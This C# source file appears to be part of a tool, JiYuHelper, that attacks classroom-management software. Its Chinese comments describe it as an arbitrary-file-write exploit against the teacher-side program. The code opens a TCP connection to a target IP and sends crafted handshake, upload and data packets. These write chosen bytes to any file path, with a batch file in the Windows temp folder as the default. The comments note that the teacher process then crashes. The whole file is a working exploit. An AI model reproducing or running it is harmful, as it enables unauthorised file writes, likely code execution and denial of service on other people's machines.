using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace JiYuHelper.Core;

/// <summary>
/// UPFB 任意文件写入利用器 (「漏洞」页)
///
/// 基于 docs/upfb-analysis.md 的逆向结论 (LibMiniMedia10/LibNET30):
///   - IFPU 路径无任何过滤 → CAsyncFile::Open(path, GENERIC_WRITE | CREATE_ALWAYS)
///   - IFPU.fileSize 字段 = 文件写入偏移 (写入 CAsyncFile::WriteFile 的 OVERLAPPED.Offset)
///   - UPFB 数据块经 64KB 暂存缓冲 (handler+0x1001C..0x2001C) 落盘, 单块硬上限 65536 字节
///   - 完成回调 (sub_100095a0) 解引用悬垂栈指针 → 每次写入后教师端进程必然崩溃 (产品缺陷)
///
/// 布局说明:
///   干净布局 (CleanLayout=true, 推荐): 数据放在包偏移 0x14, 落盘内容与发送内容逐字节一致
///   兼容布局 (CleanLayout=false): 还原原始构造 (数据在 0x20), 文件前 12 字节为头部残留
///     (len2+GUID尾+零), 内容尾部 12 字节不落盘; 有效载荷上限 65524 字节
///
/// 注意: 写入后教师端进程将在约 0.5~3.5 秒内崩溃 (悬垂栈指针 UAF), 属预期行为, 无法规避。
/// </summary>
public sealed class UpfbWriter
{
    /// <summary>单块 UPFB 数据上限 (64KB 暂存缓冲)</summary>
    public const int MaxPayloadBytes = 65536;

    /// <summary>兼容布局下文件前部的头部残留字节数</summary>
    public const int LegacyLayoutOverhead = 12;

    public sealed class Options
    {
        public string TargetIP = "127.0.0.1";
        public int Port = PacketBuilder.ControlPort;
        public string FilePath = @"C:\Windows\Temp\jy.bat";
        public uint Offset;                 // 写入偏移 (IFPU.fileSize → OVERLAPPED.Offset)
        public byte[] Data = Array.Empty<byte>();
        public bool CleanLayout = true;     // true: 内容逐字节一致; false: 兼容布局 (12B 头部残留)
        public bool SendEof = true;         // true: 发 EOF 收尾包, 文件精确截断到 offset+len
        public int HoldMs = 2500;           // 写入后保持连接时长 (等待异步写完成落盘)
    }

    public sealed class Result
    {
        public bool Success;
        public long SentBytes;
        public int ReplyBytes;
        public string? Error;
    }

    /// <summary>执行一次 UPFB 任意文件写入 (阻塞, 建议 Task.Run 调用)</summary>
    public Result Write(Options opt, CancellationToken ct)
    {
        var res = new Result();

        // ---------- 校验 ----------
        if (opt.Data.Length == 0)
        {
            res.Error = "内容为空";
            return res;
        }
        if (opt.Data.Length > MaxPayloadBytes)
        {
            res.Error = $"内容 {opt.Data.Length} 字节超过单次写入上限 {MaxPayloadBytes} 字节 (64KB 暂存缓冲)";
            return res;
        }
        if (string.IsNullOrWhiteSpace(opt.FilePath))
        {
            res.Error = "目标路径为空";
            return res;
        }
        if (string.IsNullOrWhiteSpace(opt.TargetIP))
        {
            res.Error = "目标 IP 为空";
            return res;
        }

        byte[] guid = MakeGuid();
        byte[] worb = PacketBuilder.BuildWorbPacket();
        byte[] ifpu = PacketBuilder.BuildIfpuUploadPacket(guid, opt.FilePath, opt.Offset);
        byte[] upfb = BuildUpfb(guid, opt.Data, opt.CleanLayout);
        byte[]? eof = opt.SendEof ? BuildUpfb(guid, Array.Empty<byte>(), opt.CleanLayout) : null;

        using var client = new TcpClient(AddressFamily.InterNetwork);
        client.NoDelay = true;
        client.ReceiveTimeout = 3000;
        client.SendTimeout = 3000;

        try
        {
            client.Connect(new IPEndPoint(IPAddress.Parse(opt.TargetIP), opt.Port));
            var s = client.GetStream();
            ct.ThrowIfCancellationRequested();

            // WORB 握手
            s.Write(worb, 0, worb.Length);
            res.SentBytes += worb.Length;
            ct.WaitHandle.WaitOne(100);

            // IFPU 上传初始化 (任意路径 + 写入偏移)
            s.Write(ifpu, 0, ifpu.Length);
            res.SentBytes += ifpu.Length;
            res.ReplyBytes += DrainRead(s, 800, ct);      // RFPU 确认

            // UPFB 数据块
            s.Write(upfb, 0, upfb.Length);
            res.SentBytes += upfb.Length;
            res.ReplyBytes += DrainRead(s, 800, ct);

            // EOF 收尾 (精确截断)
            if (eof != null)
            {
                s.Write(eof, 0, eof.Length);
                res.SentBytes += eof.Length;
                res.ReplyBytes += DrainRead(s, 800, ct);
            }

            // 保持连接, 等待异步写完成落盘
            var sw = Stopwatch.StartNew();
            while (sw.ElapsedMilliseconds < opt.HoldMs && !ct.IsCancellationRequested)
            {
                if (s.DataAvailable)
                {
                    var b = new byte[512];
                    int n = s.Read(b, 0, b.Length);
                    if (n > 0) res.ReplyBytes += n;
                    else break;
                }
                else Thread.Sleep(50);
            }

            try { client.Client.Shutdown(SocketShutdown.Both); } catch { }
            res.Success = true;
            return res;
        }
        catch (OperationCanceledException)
        {
            res.Error = "已取消";
            return res;
        }
        catch (Exception ex)
        {
            res.Error = ex.Message;
            return res;
        }
    }

    /// <summary>
    /// 构造 UPFB 数据包。
    /// 干净布局: 数据从包偏移 0x14 起 (覆盖长度字段与 GUID 尾部区域),
    ///           教师端完成回调从 0x14 拷贝 len-8 字节 → 落盘内容与数据完全一致。
    /// 兼容布局: 数据从 0x20 起, 0x14 处保留长度字段 (原始构造, 落盘含 12B 头部残留)。
    /// </summary>
    private static byte[] BuildUpfb(byte[] guid, byte[] data, bool cleanLayout)
    {
        int dataOff = cleanLayout ? 0x14 : 0x20;
        int totalLen = 0x0C + dataOff + data.Length;
        var p = new byte[totalLen];

        p[0] = 0x00; p[1] = 0x00; p[2] = 0x01; p[3] = 0x00;
        p[4] = 0x42; p[5] = 0x46; p[6] = 0x50; p[7] = 0x55;   // "BFUP" (magic 0x55504642)
        WriteU32(p, 8, (uint)(data.Length + 8));

        Array.Copy(guid, 0, p, 0x0C, 16);                      // 会话 GUID (前 4 字节为键)

        if (cleanLayout)
            Array.Copy(data, 0, p, 0x14, data.Length);
        else
        {
            WriteU32(p, 0x14, (uint)(data.Length + 8));        // 兼容布局的长度字段
            Array.Copy(data, 0, p, 0x20, data.Length);
        }
        return p;
    }

    /// <summary>随机会话 GUID: 前 4 字节为会话键 (std::map u32 key), 其余置零</summary>
    private static byte[] MakeGuid()
    {
        var g = new byte[16];
        new Random(Guid.NewGuid().GetHashCode()).NextBytes(g);
        return g;
    }

    private static void WriteU32(byte[] b, int off, uint v)
    {
        b[off] = (byte)v; b[off + 1] = (byte)(v >> 8); b[off + 2] = (byte)(v >> 16); b[off + 3] = (byte)(v >> 24);
    }

    /// <summary>读到无更多数据为止 (短静默窗口), 返回总字节数</summary>
    private static int DrainRead(NetworkStream s, int quietMs, CancellationToken ct)
    {
        int total = 0;
        var buf = new byte[512];
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < quietMs && !ct.IsCancellationRequested)
        {
            if (s.DataAvailable)
            {
                int n = s.Read(buf, 0, buf.Length);
                if (n <= 0) break;
                total += n;
                sw.Restart();
            }
            else Thread.Sleep(20);
        }
        return total;
    }
}
